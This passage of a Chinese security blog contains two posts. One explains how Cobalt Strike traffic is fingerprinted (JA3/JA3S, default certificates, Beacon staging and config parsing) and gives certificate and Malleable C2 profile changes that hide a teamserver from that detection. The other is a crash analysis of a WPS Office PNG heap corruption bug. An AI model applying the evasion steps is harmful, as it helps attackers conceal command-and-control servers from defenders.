0</span><br></pre></td></tr></table></figure>

<p>可以看到我们对应的伪造请求，再次启动teamserver，抓取对应流量包</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211110173336803.png" alt="image-20211110173336803"></p>
<p>我们可以看到对应的特征信息已经修改</p>
<h2 id="HTTPS流量"><a href="#HTTPS流量" class="headerlink" title="HTTPS流量"></a>HTTPS流量</h2><p>对于HTTPS流量我们是们Wireshark进行抓取</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211110175624766.png" alt="image-20211110175624766"></p>
<p>我们可以找到对应的证书数据包，导出对应的分组字节流, <code>Export selected Packet Bytes</code></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211110180152205.png" alt="image-20211110180152205"></p>
<p>计算证书的SHA256值，并在censys.io进行搜索</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ sha256sum https.cer                                                                         </span><br><span class="line">87f2085c32b6a2cc709b365f55873e207a9caa10bffecf2fd16d3cf9d94d390c  https.cer</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211110181534376.png" alt="image-20211110181534376"></p>
<p>可以看到使用该默认证书的主机</p>
<p>同时在Client Hello数据包中同样也存在</p>
<blockquote>
<p>TLS客户端进行指纹识别的思想，最初来自于<a href="https://twitter.com/synackpse">Lee Brotherston</a>于2015年的一项研究成果，对这项研究感兴趣的读者可以参阅<a href="https://blog.squarelemon.com/tls-fingerprinting/">这里</a>；与该思想相关的DerbyCon演讲可以参阅<a href="https://www.youtube.com/watch?v=XX0FRAy2Mec">这里</a>。</p>
<p>我们知道，不仅”良性的”应用程序会使用TLS及其前身SSL对其流量进行加密，而且恶意软件也常常这样做；前者这样做的目的是确保数据安全，而后者这样做的目的则是将其流量隐藏在噪声中。为了启动TLS会话，客户端将在TCP 3次握手后发送TLS客户端的Hello数据包。这个数据包及其生成方式取决于构建客户端应用程序时所使用的软件包和方法。如果接受TLS连接，服务器将使用基于服务器端库和配置以及Client Hello消息中的详细信息创建的TLS Server Hello数据包进行响应。由于TLS协商是以明文的方式传输的，所以，我们可以使用TLS Client Hello数据包中的详细信息对客户端应用程序进行指纹识别。</p>
<p>JA3 这个项目用于收集Client Hello数据包中以下字段的十进制值：包括版本、可接受的密码、扩展列表、椭圆曲线密码和椭圆曲线密码格式。然后，用<code>,</code>来分隔各个字段、用<code>-</code>来分隔各个字段中的各个值，将这些值串联在一起之后，计算 <code>MD5</code>，就是一个ja3。如果没有某个字段，则这些字段的值为空。</p>
</blockquote>
<p>字段顺序如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TLSVersion，Ciphers，Extensions，EllipticCurves，EllipticCurvePointFormats</span><br></pre></td></tr></table></figure>

<p>第一字段TLSVersion</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111114925058.png" alt="image-20211111114925058"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0303-&gt;771</span><br></pre></td></tr></table></figure>

<p>第二个字段Ciphers总共19个</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111115342676.png" alt="image-20211111115342676"></p>
<p>将对应的数值进行转化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xc02c-&gt;49196</span><br><span class="line">0xc02b-&gt;49195</span><br><span class="line">0xc030-&gt;49200</span><br><span class="line">49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10</span><br></pre></td></tr></table></figure>

<p>第三个字段Extensions</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111115749306.png" alt="image-20211111115749306"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5-10-11-13-35-23-65281</span><br></pre></td></tr></table></figure>

<p>第四个字段：EllipticCurves</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111120033782.png" alt="image-20211111120033782"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x1d-&gt;29, 0x17-&gt;23, 0x18-&gt;24</span><br><span class="line">29-23-24</span><br></pre></td></tr></table></figure>

<p>第五个字段：EllipticCurvePointFormats</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111120208129.png" alt="image-20211111120208129"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0</span><br></pre></td></tr></table></figure>

<p>将五个字段用<code>,</code>拼接如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10,5-10-11-13-35-23-65281,29-23-24,0</span><br></pre></td></tr></table></figure>

<p>做MD5加密如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">In [1]: import hashlib</span><br><span class="line"></span><br><span class="line">In [2]: hashlib.md5((&#39;771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10,5-10-11-13-35-23-65281,29-23-24,0&#39;).encode(encoding&#x3D;&quot;utf-8&quot;)).hexdigest()</span><br><span class="line">Out[2]: &#39;72a589da586844d7f0818ce684948eea&#39;</span><br></pre></td></tr></table></figure>

<p>也可以使用对应的脚本直接进行解密</p>
<p><a href="https://github.com/salesforce/ja3">https://github.com/salesforce/ja3</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python ja3.py ~&#x2F;Documents&#x2F;0.OL4THREE&#x2F;HTTPS-WIN10.pcapng</span><br><span class="line">[10.17.21.136:443] JA3: 771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10,5-10-11-13-35-23-65281,29-23-24,0 --&gt; 72a589da586844d7f0818ce684948eea</span><br><span class="line">[10.17.21.136:443] JA3: 771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10,5-10-11-13-35-23-65281,29-23-24,0 --&gt; 72a589da586844d7f0818ce684948eea</span><br><span class="line">[10.17.21.136:443] JA3: 771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10,5-10-11-13-35-23-65281,29-23-24,0 --&gt; 72a589da586844d7f0818ce684948eea</span><br></pre></td></tr></table></figure>



<p>对比 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FByteSecLabs%2Fja3-ja3s-combo%2Fblob%2Fmaster%2Fmaster-list.txt">https://github.com/ByteSecLabs/ja3-ja3s-combo/blob/master/master-list.txt</a> 可证实是CobaltStrike的ja3指纹</p>
<p>同样的我们也可以去计算下服务端的ja3s</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python ja3s.py ~&#x2F;Documents&#x2F;0.OL4THREE&#x2F;HTTPS-WIN10.pcapng</span><br><span class="line">[192.168.72.177:1667] JA3S: 771,CipherSuite(TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384),23-35-65281 --&gt; f9a2073be9cd81e756f9c3ab50ba9bd1</span><br><span class="line">[192.168.72.177:1668] JA3S: 771,CipherSuite(TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384),23-35-65281 --&gt; f9a2073be9cd81e756f9c3ab50ba9bd1</span><br><span class="line">[192.168.72.177:1669] JA3S: 771,CipherSuite(TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384),23-35-65281 --&gt; f9a2073be9cd81e756f9c3ab50ba9bd1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>MetaSploit 的 Meterpreter 和 CobaltStrike（并非4.1版本） 的 Beacon 都使用 Windows 套接字来启动 TLS 通信。在 Windows 10 上，JA3=72a589da586844d7f0818ce684948eea（指定 IP 地址），JA3=a0e9f5d64349fb13191bc781f81f42e1（指定域名）。由于 Windows 上的其他普普通通的应用程序也使用相同的套接字，因此，我们很难识别其中的恶意通信。但是，Kali Linux 上的 C2 服务器对该客户端应用程序的响应方式与 Internet 上的普通服务器对该套接字的响应方式相比来说是独一无二的。尽管服务器对不同客户端的响应不同，但它们对同一客户端的响应总是一致的。因此，如果结合 ja3+ja3s，就能够识别这种恶意通信，而不用考虑目的地 IP、域名或证书等细节信息。</p>
<p>JA3和JA3S是一种基于TLS指纹的安全分析方法。JA3指纹能够指示客户端应用程序通过TLS通信的方式，而JA3指纹能够指示服务器响应。如果两者结合起来，实质上就生成了客户端和服务器之间的加密协商的指纹。虽然基于TLS的检测方法不一定是灵丹妙药，也不一定能保证映射到客户端应用程序，但它们始终是安全分析的轴心所在。</p>
</blockquote>
<p>所以对于HTTPS证书特征，建议一定要修改默认的HTTPS证书，重新申请一个HTTPS证书，</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111151224222.png" alt="image-20211111151224222"></p>
<p>之后会生成对应的TXT记录，复制进对应的DNS域名管理，解析后下载文件。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111151350019.png" alt="image-20211111151350019"></p>
<p>之后会得到full_chain.pem证书和private私钥两个文件。上传至cobalt strike文件夹下，使用keytool重新创建证书</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111171130139.png" alt="image-20211111171130139"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111171206190.png" alt="image-20211111171206190"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -export -in full_chain.pem -inkey private.key -out Wings.p12 -name Wings -passout pass:wings123456</span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass wings123456 -destkeypass ccc123456 -destkeystore wings.store -srckeystore Wings.p12 -srcstoretype PKCS12 -srcstorepass wings123456 -alias Wings</span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass wings123456 -destkeypass ccc123456 -destkeystore wings.jks -srckeystore Wings.p12 -srcstoretype PKCS12 -srcstorepass wings123456 -alias Wings</span><br></pre></td></tr></table></figure>

<p>创建后，在profile配置文件中，添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line">    set keystore &quot;wings.store&quot;;</span><br><span class="line">    set password &quot;wings123456&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时将teamserver中修改调用的store和对应的密码，进行启动发现证书已经修改</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111184234913.png" alt="image-20211111184234913"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111184332351.png" alt="image-20211111184332351"></p>
<p>在生成可执行文件时，点击Sign executable file 进行勾选</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112165849625.png" alt="image-20211112165849625" style="zoom:50%;">

<p>再次抓取流量进行分析</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112170016737.png" alt="image-20211112170016737"></p>
<p>发现证书信息已经修改</p>
<h2 id="Beacon-Staging-特征"><a href="#Beacon-Staging-特征" class="headerlink" title="Beacon Staging 特征"></a>Beacon Staging 特征</h2><p>在cobalt strike 上线的时候，首先投递一个被称为stager的小巧payload，然后去beacon staging server下载体积较大更复杂的stage。具体细节不是很明白。<br>通过访问默认的uri就可以获取到cobalt strike 的shellcode。有师傅已经写好了<code>grab_beacon_config.nse</code>脚本来识别beacon staging的特征。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap xxx.xxx.xxx.xxx --script&#x3D;grab_beacon_config.nse</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112154717717.png" alt="image-20211112154717717"></p>
<p>当CobaltStrike的stager在受害端运行时，会请求TeamServer端拉取Beacon进行在内存中反射注入运行，先运行stage，打开wireshark抓包</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112162211687.png" alt="image-20211112162211687"></p>
<p>可以看到受害段访问teamserver <a href="http://192.168.137.94/EuNU">http://192.168.137.94/EuNU</a></p>
<p>访问并下载对应脚本</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112162549739.png" alt="image-20211112162549739"></p>
<p>然后通过脚本对stager进行解密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys,struct</span><br><span class="line"></span><br><span class="line">filename &#x3D; sys.argv[1]</span><br><span class="line">data &#x3D; open(filename, &#39;rb&#39;).read()</span><br><span class="line">t &#x3D; bytearray(data[0x45:])</span><br><span class="line">(a,b) &#x3D; struct.unpack_from(&#39;&lt;II&#39;, t)</span><br><span class="line">key &#x3D; a</span><br><span class="line">t2 &#x3D; t[8:]</span><br><span class="line">out &#x3D; &quot;&quot;</span><br><span class="line">for i in range(len(t2)&#x2F;4):</span><br><span class="line">    temp &#x3D; struct.unpack_from(&#39;&lt;I&#39;, t2[i*4:])[0]</span><br><span class="line">    temp ^&#x3D; key</span><br><span class="line">    out +&#x3D; struct.pack(&#39;&lt;I&#39;, temp)</span><br><span class="line">    key ^&#x3D; temp</span><br><span class="line">open(filename+&#39;.decoded&#39;, &#39;wb&#39;).write(out)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python decostager.py EuNU</span><br></pre></td></tr></table></figure>

<p>然后多出来一个EuNU.decoded文件，之后我们利用如下脚本可以解析出对应的配置信息</p>
<p><a href="https://github.com/Sentinel-One/CobaltStrikeParser">https://github.com/Sentinel-One/CobaltStrikeParser</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python3 ..&#x2F;CobaltStrikeParser-master&#x2F;parse_beacon_config.py EuNU.decoded</span><br><span class="line">BeaconType                       - HTTP</span><br><span class="line">Port                             - 80</span><br><span class="line">SleepTime                        - 5000</span><br><span class="line">MaxGetSize                       - 1048576</span><br><span class="line">Jitter                           - 0</span><br><span class="line">MaxDNS                           - 255</span><br><span class="line">PublicKey_MD5                    - defb5d95ce99e1ebbf421a1a38d9cb64</span><br><span class="line">C2Server                         - 192.168.137.94,&#x2F;s&#x2F;ref&#x3D;nb_sb_noss_1&#x2F;167-3294888-0262949&#x2F;field-keywords&#x3D;books</span><br><span class="line">UserAgent                        - Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; Trident&#x2F;7.0; rv:11.0) like Gecko</span><br><span class="line">HttpPostUri                      - &#x2F;N4215&#x2F;adj&#x2F;amzn.us.sr.aps</span><br><span class="line">Malleable_C2_Instructions        - Empty</span><br><span class="line">HttpGet_Metadata                 - ConstHeaders</span><br><span class="line">                                   	Accept: *&#x2F;*</span><br><span class="line">                                   	Host: www.amazon.com</span><br><span class="line">                                   Metadata</span><br><span class="line">                                   	base64</span><br><span class="line">                                   	prepend &quot;session-token&#x3D;&quot;</span><br><span class="line">                                   	prepend &quot;skin&#x3D;noskin;&quot;</span><br><span class="line">                                   	append &quot;csm-hit&#x3D;s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;</span><br><span class="line">                                   	header &quot;Cookie&quot;</span><br><span class="line">HttpPost_Metadata                - ConstHeaders</span><br><span class="line">                                   	Accept: *&#x2F;*</span><br><span class="line">                                   	Content-Type: text&#x2F;xml</span><br><span class="line">                                   	X-Requested-With: XMLHttpRequest</span><br><span class="line">                                   	Host: www.amazon.com</span><br><span class="line">                                   ConstParams</span><br><span class="line">                                   	sz&#x3D;160x600</span><br><span class="line">                                   	oe&#x3D;oe&#x3D;ISO-8859-1;</span><br><span class="line">                                   	s&#x3D;3717</span><br><span class="line">                                   	dc_ref&#x3D;http%3A%2F%2Fwww.amazon.com</span><br><span class="line">                                   SessionId</span><br><span class="line">                                   	parameter &quot;sn&quot;</span><br><span class="line">                                   Output</span><br><span class="line">                                   	base64</span><br><span class="line">                                   	print</span><br><span class="line">PipeName                         -</span><br><span class="line">DNS_Idle                         - 0.0.0.0</span><br><span class="line">DNS_Sleep                        - 0</span><br><span class="line">SSH_Host                         - Not Found</span><br><span class="line">SSH_Port                         - Not Found</span><br><span class="line">SSH_Username                     - Not Found</span><br><span class="line">SSH_Password_Plaintext           - Not Found</span><br><span class="line">SSH_Password_Pubkey              - Not Found</span><br><span class="line">SSH_Banner                       -</span><br><span class="line">HttpGet_Verb                     - GET</span><br><span class="line">HttpPost_Verb                    - POST</span><br><span class="line">HttpPostChunk                    - 0</span><br><span class="line">Spawnto_x86                      - %windir%\syswow64\rundll32.exe</span><br><span class="line">Spawnto_x64                      - %windir%\sysnative\rundll32.exe</span><br><span class="line">CryptoScheme                     - 0</span><br><span class="line">Proxy_Config                     - Not Found</span><br><span class="line">Proxy_User                       - Not Found</span><br><span class="line">Proxy_Password                   - Not Found</span><br><span class="line">Proxy_Behavior                   - Use IE settings</span><br><span class="line">Watermark                        - 305419896</span><br><span class="line">bStageCleanup                    - False</span><br><span class="line">bCFGCaution                      - False</span><br><span class="line">KillDate                         - 0</span><br><span class="line">bProcInject_StartRWX             - True</span><br><span class="line">bProcInject_UseRWX               - True</span><br><span class="line">bProcInject_MinAllocSize         - 0</span><br><span class="line">ProcInject_PrependAppend_x86     - Empty</span><br><span class="line">ProcInject_PrependAppend_x64     - Empty</span><br><span class="line">ProcInject_Execute               - CreateThread</span><br><span class="line">                                   SetThreadContext</span><br><span class="line">                                   CreateRemoteThread</span><br><span class="line">                                   RtlCreateUserThread</span><br><span class="line">ProcInject_AllocationMethod      - VirtualAllocEx</span><br><span class="line">bUsesCookies                     - True</span><br><span class="line">HostHeader                       -</span><br><span class="line">headersToRemove                  - Not Found</span><br><span class="line">DNS_Beaconing                    - Not Found</span><br><span class="line">DNS_get_TypeA                    - Not Found</span><br><span class="line">DNS_get_TypeAAAA                 - Not Found</span><br><span class="line">DNS_get_TypeTXT                  - Not Found</span><br><span class="line">DNS_put_metadata                 - Not Found</span><br><span class="line">DNS_put_output                   - Not Found</span><br><span class="line">DNS_resolver                     - Not Found</span><br><span class="line">DNS_strategy                     - Not Found</span><br><span class="line">DNS_strategy_rotate_seconds      - Not Found</span><br><span class="line">DNS_strategy_fail_x              - Not Found</span><br><span class="line">DNS_strategy_fail_seconds        - Not Found</span><br></pre></td></tr></table></figure>

<h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><h4 id="从防火墙上限制访问beacon的端口。"><a href="#从防火墙上限制访问beacon的端口。" class="headerlink" title="从防火墙上限制访问beacon的端口。"></a>从防火墙上限制访问beacon的端口。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 443 -j DROP </span><br><span class="line">iptables -I INPUT -s xx.xx.xx.xx -ptcp --dport 443 -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>重新启动网卡，即可</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112164856353.png" alt="image-20211112164856353" style="zoom:50%;">

<h4 id="修改profile文件"><a href="#修改profile文件" class="headerlink" title="修改profile文件"></a>修改profile文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http-stager &#123;</span><br><span class="line">    set uri_x86 &quot;&#x2F;get32.gif&quot;;</span><br><span class="line">    set uri_x64 &quot;&#x2F;get64.gif&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        parameter &quot;id&quot; &quot;1234&quot;;</span><br><span class="line">        header &quot;Cookie&quot; &quot;SomeValue&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;image&#x2F;gif&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            prepend &quot;GIF89a&quot;;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再次生成请求，进行抓包发现对应信息已经修改</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112165259063.png" alt="image-20211112165259063"></p>
<p>再次访问链接,为以下格式</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112165737808.png" alt="image-20211112165737808"></p>
<h4 id="修改源码加密的密钥"><a href="#修改源码加密的密钥" class="headerlink" title="修改源码加密的密钥"></a>修改源码加密的密钥</h4><p>该内容在CobaltStrike二开特征修改中。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://www.feidao.site/wordpress/?p=4457">http://www.feidao.site/wordpress/?p=4457</a></p>
<p>[<a href="https://kam1.cc/2021/08/09/Cobalt%20Strike%E9%9A%90%E8%97%8F%E7%89%B9%E5%BE%81%E4%B8%8E%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F/]">https://kam1.cc/2021/08/09/Cobalt%20Strike%E9%9A%90%E8%97%8F%E7%89%B9%E5%BE%81%E4%B8%8E%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F/]</a>(<a href="https://kam1.cc/2021/08/09/Cobalt">https://kam1.cc/2021/08/09/Cobalt</a> Strike隐藏特征与混淆流量/)</p>
<p><a href="https://www.freebuf.com/articles/endpoint/253322.html">https://www.freebuf.com/articles/endpoint/253322.html</a></p>
<p><a href="https://paper.seebug.org/1349/">https://paper.seebug.org/1349/</a></p>
<p><a href="https://mp.weixin.qq.com/s/6nBrRJHFFpCw4N90n8aURA">https://mp.weixin.qq.com/s/6nBrRJHFFpCw4N90n8aURA</a></p>
<p><a href="https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967">https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967</a></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>C2</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>金山WPS Office远程堆损坏漏洞</title>
    <url>/2020/09/13/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwnable.kr/Exploit/%E9%87%91%E5%B1%B1WPS-Office%E8%BF%9C%E7%A8%8B%E5%A0%86%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><p>WPS Office是由Microsoft珠海的中国软件开发商金山软件开发的办公套件，适用于Microsoft Windows，macOS，Linux，iOS和Android。WPS Office由三个主要组件组成：WPS Writer，WPS Presentation和WPS Spreadsheet。个人基本版本可以免费使用。WPS Office软件中存在一个远程执行代码漏洞，是当Office软件在分析特制Office文件时不正确地处理内存中的对象时引起的。成功利用此漏洞的攻击者可以在当前用户的上下文中运行任意代码。故障可能会导致拒绝服务。漏洞产品WPS Office，影响版本11.2.0.9453。</p>
<a id="more"></a>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在WPS Office中用于图像格式解析的Qt模块中发现堆损坏。嵌入WPS office的特制图像文件可能会触发此漏洞。打开特制的文档文件时，触发访问冲突。EDX指向数组的指针，而EAX是指向数组的索引。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; g</span><br><span class="line">(c50.b4): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax&#x3D;000000c0 ebx&#x3D;006f1c48 ecx&#x3D;cd2aefbc edx&#x3D;cd2c6f80 esi&#x3D;2ed7ae18 edi&#x3D;0000001c</span><br><span class="line">eip&#x3D;6ba13321 esp&#x3D;006f1b44 ebp&#x3D;006f1b44 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00210202</span><br><span class="line">QtCore4!QMatrix::dy+0x48a8:</span><br><span class="line">6ba13321 8b448210        mov     eax,dword ptr [edx+eax*4+10h] ds:002b:cd2c7290&#x3D;????????</span><br></pre></td></tr></table></figure>

<p>崩溃是如何触发的？让我们看一下PNG标头格式。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00029E30  FF 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44  ÿ‰PNG........IHD</span><br><span class="line">00029E40  52 00 00 02 80 00 00 01 C6 04 03 00 00 00 16 0A  R...€...Æ.......</span><br><span class="line">00029E50  27 FC 00 00 00 04 67 41 4D 41 00 00 B1 88 95 98  &#39;ü....gAMA..±ˆ•˜</span><br><span class="line">00029E60  F4 A6 00 00 00 30 50 4C 54 45 00 00 00 80 00 00  ô¦...0PLTE...€..</span><br><span class="line">00029E70  00 80 00 80 80 00 00 00 80 80 00 80 00 80 80 80  .€.€€...€€.€.€€€</span><br><span class="line">00029E80  80 80 C0 C0 C0 FF 00 00 00 FF 00 FF FF 00 00 00  €€ÀÀÀÿ...ÿ.ÿÿ...</span><br><span class="line">00029E90  FF FF 00 FF 00 FF FF FF FF FF 7B 1F B1 C4 00 00  ÿÿ.ÿ.ÿÿÿÿÿ&#123;.±Ä..</span><br></pre></td></tr></table></figure>

<p>从偏移量0x29E31开始-0x29E34是PNG文件格式的签名标头。PNG头文件的结构：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PNG signature --&gt; IHDR --&gt; gAMA --&gt; PLTE --&gt; pHYs --&gt; IDAT --&gt; IEND</span><br></pre></td></tr></table></figure>

<p>在这种情况下，当WPS Office Suite中使用的QtCore库解析PLTE结构并触发堆破坏时，该漏洞位于Word文档中的嵌入式PNG文件中。在偏移量0x29E82到0x29E85处，调色板的解析失败，从而触发了堆中的内存损坏。崩溃触发之前的堆栈跟踪：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00ee1790 6b8143ef QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a71</span><br><span class="line">01 00ee17f0 6b814259 QtCore4!QBrush::setMatrix+0x234</span><br><span class="line">02 00ee58d4 6b8249a4 QtCore4!QBrush::setMatrix+0x9e</span><br><span class="line">03 00ee58ec 6b80cc84 QtCore4!QImage::rect+0x22b</span><br><span class="line">04 00ee5908 6b857ccc QtCore4!QTransform::inverted+0xec8</span><br><span class="line">05 00ee629c 6b81c55b QtCore4!QSvgFillStyle::setFillOpacity+0x1b59</span><br><span class="line">06 00ee6480 6b896844 QtCore4!QPainter::drawPixmap+0x1c98</span><br><span class="line">07 00ee6574 6d1e0fbd QtCore4!QPainter::drawImage+0x325</span><br><span class="line">08 00ee6594 6d0dd155 kso!GdiDrawHoriLineIAlt+0x11a1a</span><br></pre></td></tr></table></figure>

<p>在QtCore4解析嵌入式图像之前，我们可以看到来自KSO模块的最后一次调用，试图处理图像kso！GdiDrawHoriLineIAlt。使用IDA Pro分解应用程序来分析发生异常的功能。最后的崩溃路径如下（WinDBG结果）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QtCore4!QMatrix::dy+0x48a8:</span><br><span class="line">6ba13321 8b448210        mov     eax,dword ptr [edx+eax*4+10h] ds:002b:cd2c7290&#x3D;????????</span><br></pre></td></tr></table></figure>

<p>在IDA Pro中打开时，我们可以按以下方式反汇编该函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:67353315                 push    ebp</span><br><span class="line">.text:67353316                 mov     ebp, esp</span><br><span class="line">.text:67353318                 movzx   eax, byte ptr [ecx+edx]  ; crash here</span><br><span class="line">.text:6735331C                 mov     ecx, [ebp+arg_0]</span><br><span class="line">.text:6735331F                 mov     edx, [ecx]</span><br><span class="line">.text:67353321                 mov     eax, [edx+eax*4+10h]</span><br><span class="line">.text:67353325                 mov     ecx, eax</span><br></pre></td></tr></table></figure>

<p>使用故障转储中的信息，我们知道应用程序在0x67353321（移动eax，[edx + eax * 4 + 10h]）处触发了访问冲突。我们可以看到EAX寄存器由0xc0值控制。因此，从这里我们可以根据导致异常的指令对寄存器的状态进行一些假设。需要注意的重要一点是，在发生异常之前，我们可以看到ECX（0xc0）中包含的值被写入到以下指令所定义的任意位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov     ecx, [ebp+arg_0]</span><br></pre></td></tr></table></figure>

<p>此外，我们注意到，在我们的故障指令之外，EBP的偏移量存储在ECX寄存器中。我们在前面提到的指令（偏移量为0x6ba1331c）上设置了一个断点，以观察内存。断点触发后，我们可以看到第一个值c45adfbc引用了另一个指针，该指针应该是指向数组的指针。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Breakpoint 0 hit</span><br><span class="line">eax&#x3D;0000000f ebx&#x3D;004f1b40 ecx&#x3D;d3544100 edx&#x3D;0000001c esi&#x3D;d1200e18 edi&#x3D;0000001c</span><br><span class="line">eip&#x3D;6ba1331c esp&#x3D;004f1a34 ebp&#x3D;004f1a34 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;0023  ss&#x3D;002b  ds&#x3D;002b  es&#x3D;002b  fs&#x3D;0053  gs&#x3D;002b             efl&#x3D;00200202</span><br><span class="line">QtCore4!QMatrix::dy+0x48a3:</span><br><span class="line">6ba1331c 8b4d08          mov     ecx,dword ptr [ebp+8] ss:002b:004f1a3c&#x3D;c45adfbc</span><br><span class="line"></span><br><span class="line">0:000&gt; dc ebp+8</span><br><span class="line">004f1a3c  c45adfbc 00000048 00000000 6f13830f  ..Z.H..........o</span><br><span class="line">004f1a4c  004f5cc8 00000000 00000000 00000000  .\O.............</span><br><span class="line">004f1a5c  00000000 